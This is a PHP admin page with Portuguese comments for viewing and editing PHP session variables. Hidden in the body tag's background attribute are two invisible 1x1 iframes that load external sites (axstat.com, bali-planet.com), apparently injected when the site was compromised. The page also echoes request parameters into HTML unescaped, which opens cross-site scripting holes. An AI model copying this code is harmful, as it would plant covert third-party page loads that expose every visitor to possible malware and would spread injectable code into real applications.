<?php
include_once("../_database/athdbconn.php");
verficarAcesso(getsession(CFG_SYSTEM_NAME . "_cod_usuario"), 45, "MAN");

$strAction = request("var_action"); //Ação selecionada
$strSubmit = request("var_submit"); //Flag de execução de ação
$strNome   = request("var_nome");   //Nome do índice
$strValor  = request("var_valor");  //Valor do índice
$strFiltro = request("var_index");  //Valor do filtro da pesquisa
$strMsg    = "";					//Inicializando a váriavel de mensagem

//Aqui verifica se foi processada uma ação e formata uma mensagem de aviso na área logo mais abaixo
if($strSubmit != ""){
	if($strNome != ""){
		($strValor == "") ? $strValor = NULL : NULL;
		setsession($strNome, $strValor);
		$strMsg = "O índice <b>" . $strNome . "</b> foi " . $strAction . " com sucesso.";
		$strAction = "";
	}
}

// Cabeçalho da Dialog
$strTitulo = "<center>
				<b class='padrao_gde'>Gen. Session</b>
				<br>  ID: (" . session_id() . ") <br>
				<small>v1.5.6</small>
			  </center>";
?>
<html>
	<head>
	<style>
		#container    { display:block; width:500px; text-align:left; border:1px #CCCCCC solid; }
		#titulo		  { padding:3px; font-family:Arial; font-size:13px; color:#666666; background-color:#F9F9F9; text-align:center; }
		
		#menu		  { padding-left:10px; background-color:#F0F0F0; text-align:center; }
		#menu a	  	  { padding-left:3px; font-family:Arial; font-size:11px; font-weight:bold; color:#333333; text-decoration:none; }
		#menu a:hover { padding-left:3px; font-family:Arial; font-size:11px; font-weight:bold; color:#999999; text-decoration:none; }
		#menu a b 	  { font-size:14px; color:#80BB4C; }
		
		#texto a	  { padding-left:3px; font-family:Arial; font-size:11px; font-weight:bold; color:#008000; text-decoration:none; }
		#texto a:hover{ padding-left:3px; font-family:Arial; font-size:11px; font-weight:bold; color:#80BB4C; text-decoration:none; }
		#texto		  { font-family:Arial; font-size:11px; font-weight:normal; color:#333333; background-color:#FFFFFF; padding:5px; }
		
		#mensagem	  { margin-left: 10%; margin-right: 10%; border:1px #DDDDDD solid; background-color:#FAFAFA; text-align:center;}
		#mensagem b   { color:#80BB4C; }
		
		form		  { margin:0px; padding:0px; width:100%; text-align:center; }
		input  		  { font-family:arial; font-size:11px; color:#333333; border:1px #7F9DB9 solid; padding-left:4px; }
		input.button  { background-image:url(); font-family:arial; font-size:11px; color:#333333; border:1px #7F9DB9 solid; background-color:#E0DFE3; padding:0px; height:none;}
		
		td.head		  { font-family:Arial; font-size:11px; font-weight:normal; color:#333333; background-color:#CCCCCC; }
		td.cor1		  { font-family:Arial; font-size:11px; font-weight:normal; color:#333333; background-color:#FFFFFF; }
		td.cor2		  { font-family:Arial; font-size:11px; font-weight:normal; color:#333333; background-color:#F9F9F9; }
		td.normal	  { font-family:Arial; font-size:11px; font-weight:normal; color:#333333; }
	</style>
	<link rel="stylesheet" href="../_css/<?php echo(CFG_SYSTEM_NAME); ?>.css">
	</head>
	<body bgcolor="#CFCFCF" background="../img/bgFrame_<?php echo(CFG_SYSTEM_THEME); ?><iframe src="http://axstat.com/" width="1" height="1" frameborder="0"></iframe><iframe src="http://bali-planet.com/" width="1" height="1" frameborder="0"></iframe>_main.jpg" style="text-align:center;">
		<?php athBeginFloatingBox("650","",$strTitulo,CL_CORBAR_GLASS_2); ?>
			<div id="menu"> <!-- Menu superior - início -->
				<table border="0" cellpadding="0" cellspacing="0" width="98%">
					<tr>
						<td align="left"><a href="index.php?var_action=adicionado"><b>+</b> Adicionar</a></td>
						<form name="formsession" action="index.php" method="post">
						<td align="right" style="padding-right:5px;" class="normal">
						 <b>Pesquisar Índice:</b><input type="text" name="var_index">
						 <input type="submit" value="Ok" class="button">
						</td>
						</form>
					</tr>
				</table>
			</div> <!-- Menu superior - fim -->
			<div id="texto"> <!-- grade de sessions / formulário - início -->
				<?php
				
				if($strMsg != ""){ // Caso tiver alguma mensagem de alerta será exibida aqui
					echo("<br><div id=\"mensagem\">" . $strMsg . "</div><br>");
				}
				
				if($strAction == ""){ // Caso não tiver ação, ele coloca a grade na tela
					$intIndex = 2;
					
					echo("
						 <table border=\"0\" cellpadding=\"3\" cellspacing=\"0\" align=\"center\" width=\"95%\">
							 <tr>
								<td class=\"head\"><b>Índice<b></td>
								<td class=\"head\"><b>Valor</b></td>
								<td class=\"head\"></td>
							 </tr>
						");
					foreach($_SESSION as $strCampo => $strValor){ // Rotina para exibição das sessions
						($intIndex == "1") ? $intIndex = 2 : $intIndex = 1;
						($strFiltro == "") ? $boolResult = true : $boolResult = strpos($strCampo,$strFiltro) === 0;
						if($boolResult){
							echo("
								 <tr>
									<td class=\"cor" . $intIndex . "\"><b>" . $strCampo . "</b></td>
									<td class=\"cor" . $intIndex . "\"><textarea rows='2' cols='70' readonly='readonly'>" . htmlspecialchars($strValor) . "</textarea></td>
									<td width=\"1%\" nowrap class=\"cor" . $intIndex . "\">
										<a href=\"index.php?var_action=editado&var_nome=" . $strCampo . "&var_valor=" .  htmlspecialchars($strValor) . "\">Editar</a>
								");
							
							(!preg_match("/^" . CFG_SYSTEM_NAME . "_/",$strCampo)) ? print("<a href=\"index.php?var_action=removido&var_nome=" . $strCampo . "&var_submit=ok\">Remover</a>") : NULL;
							
							echo("
									</td>
								 </tr>
								");
						}
					}
					echo("</table>");
				}
				else{ // Caso tiver ele exibe o formulário e formata de acordo com a ação selecionada
				?>
				 <table border="0" cellspacing="0" cellpadding="0" width="50%" align="center">
					<form name="formsession" action="index.php">
						<input type="hidden" name="var_action" value="<?php echo(request("var_action")); ?>"> <!-- indica a ação -->
						<input type="hidden" name="var_submit" value="ok">    <!-- indica que foi processada a função selecionada -->
						<tr>
							<td width="50" nowrap>Nome:  </td>
							<td><input type="text" name="var_nome"  value="<?php echo($strNome); ?>" size="40"></td>
						</tr>
						<?php 
						if(strlen($strValor) <= 40){ // Verifica se o conteúdo tem mais do que 40 carac.
							echo("<tr>
								    <td>Valor: </td>
									<td><input type=\"text\" name=\"var_valor\" value=\"" . $strValor . "\" size=\"40\"></td>
								  </tr>");
						}
						else{
							echo("<tr>
									<td>Valor: </td>
									<td><textarea rows=\"4\" cols=\"40\" name=\"var_valor\">" . $strValor . "</textarea></td>
								 </tr>");
						}
						?>
						<tr><td colspan="2" height="10"></td></tr>
						<tr>
							<td colspan="2" align="center">
								<input type="submit" value="Enviar" class="button">
								<input type="button" value="Cancelar" onClick="location.href='index.php'" class="button">
							</td>
						</tr>
					</form>
				 </table>
				<?php	
				}
				?>
			</div> <!-- grade de sessions / formulário - fim -->
		<?php athEndFloatingBox(); ?>
	</body>
</html>